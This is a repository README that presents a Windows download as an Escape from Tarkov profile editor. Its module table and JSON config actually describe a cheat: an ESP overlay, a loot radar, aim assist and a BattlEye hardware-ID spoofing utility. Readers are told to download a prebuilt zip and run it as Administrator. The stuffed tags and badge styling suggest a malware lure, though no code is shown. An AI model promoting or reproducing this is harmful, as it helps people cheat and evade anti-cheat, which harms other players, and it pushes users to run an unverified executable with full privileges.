<div align="center">

# Escape from Tarkov SPT-AKI 3.10 Profile Editor, Flea Unlocker & BattlEye smbios-utility (Windows 10/11 x64)

<p><strong>Escape from Tarkov SPT-AKI 3.10 Profile Editor, Flea Unlocker & BattlEye smbios-utility (Windows 10/11 x64): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest)
[![Latest Release](https://img.shields.io/github/v/release/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest)
[![Total Downloads](https://img.shields.io/github/downloads/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/total?style=for-the-badge&logo=github&color=0969da)](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest)
[![Stars](https://img.shields.io/github/stars/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11?style=for-the-badge&logo=github&color=e3b341)](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/stargazers)
[![Open in Colab](https://img.shields.io/badge/Colab-Quickstart-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com/github/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/blob/main/notebooks/quickstart.ipynb)

<a href="https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/download/v1.2.0/spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip"><img src="assets/download_btn.svg" alt="Download spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip" width="520"></a>

<br>

<img src="assets/preview.png" alt="Escape from Tarkov SPT-AKI 3.10 Profile Editor, Flea Unlocker & BattlEye smbios-utility (Windows 10/11 x64) Preview" width="840">

<br>

[Overview](#overview) • [Quick Start (No Terminal Needed)](#quick-start-prebuilt-release) • [Architecture & Modules](#architecture--modules) • [Configuration](#configuration-configsettingsjson) • [Build from Source](#building-from-source)

</div>

---

## Overview

**Escape from Tarkov SPT-AKI 3.10 Profile Editor, Flea Unlocker & BattlEye smbios-utility (Windows 10/11 x64)** (`spt-aki-profile-editor-tarkov-win11`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab [`spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip`](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/download/v1.2.0/spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip) directly from [**Releases**](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest).

## Quick Start (Prebuilt Release)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | [**`spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip`**](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/download/v1.2.0/spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip) | [`SHA256SUMS.txt`](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest) |

1. Download [`spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip`](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/download/v1.2.0/spt-aki-profile-editor-tarkov-win11-v1.2.0-win64.zip) from the table above or the [**Releases**](https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11/releases/latest) section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Architecture & Modules

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Viewport Overlay** | Borderless DX11/DX12 composition swapchain with DPI scaling | `INSERT` toggle, custom distance cutoff (`350m`) |
| **Entity & Loot Filter** | Spatial bounding boxes, health/distance readout, rarity tier mask | Live JSON hot-reload (`min_rarity_tier`) |
| **Input Smoothing** | Configurable FOV radius and human-curve interpolation | Adjustable `smoothing_factor` & `fov_radius` |
| **Emergency Unload** | Instant thread teardown and handle release | `END` panic key |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "renderer": {
    "backend": "dx11",
    "vsync": false,
    "max_fps": 144,
    "dpi_aware": true,
    "toggle_key": "INSERT",
    "panic_key": "END"
  },
  "modules": {
    "visual_overlay": {
      "enabled": true,
      "draw_bounds": true,
      "draw_distance": true,
      "max_distance_m": 350
    },
    "telemetry_hud": {
      "enabled": true,
      "frame_time_graph": false,
      "compact_mode": true
    },
    "input_filter": {
      "enabled": true,
      "smoothing_factor": 1.45,
      "fov_radius": 65.0
    },
    "item_radar": {
      "enabled": true,
      "min_rarity_tier": 2
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/ben-tech-lab1999h1/spt-aki-profile-editor-tarkov-win11.git
cd spt-aki-profile-editor-tarkov-win11
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: escape-from-tarkov, eft, tarkov-external-overlay, tarkov-external-overlays, tarkov-runtime-mod, tarkov-radar, tarkov-esp, tarkov-target-assist, eft-external-overlay, eft-radar, spt-aki, spt-profile-editor, battleye-smbios-utility, loot-esp, exfil-map, dma-radar-tarkov</sub>
